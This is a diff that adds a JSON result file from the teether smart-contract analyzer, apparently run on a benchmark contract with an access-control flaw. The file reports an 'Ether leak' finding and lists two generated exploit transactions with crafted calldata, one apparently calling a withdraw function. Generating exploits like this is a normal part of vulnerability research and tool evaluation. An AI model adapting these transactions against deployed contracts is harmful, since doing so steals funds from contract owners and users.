@@ -1,0 +1,20 @@
+{
+    "errors": [],
+    "fails": [],
+    "findings": [
+        {
+            "exploit": [
+                "eth.sendTransaction({from:\"0x0000000000000000000000000000000000001234\", data:\"0x1ab06ee54ef1d2ad89edf8c4d91132028e8195cdf30bb4b5053d4f8cd260341d4805f30ae5e5e5e5e5e5e5e5e5e5e5e50000000000000000000000000000000000001234\", to:\"0x0000000000000000000000000000000000001000\", gasPrice:0})",
+                "eth.sendTransaction({from:\"0x0000000000000000000000000000000000001234\", data:\"0x3ccfd60b0b0b0b0b0b0b0b0b0b0b0b0b0b0b0b0b0b0b0b0b0b0b0b0b0b0b0b0b\", to:\"0x4000000000000000000000000000000000000000\", gasPrice:0})"
+            ],
+            "filename": "dataset/access_control/mapping_write.rt.hex",
+            "name": "Ether leak"
+        }
+    ],
+    "infos": [],
+    "parser": {
+        "id": "teether",
+        "mode": "runtime",
+        "version": "2022/11/11"
+    }
+}
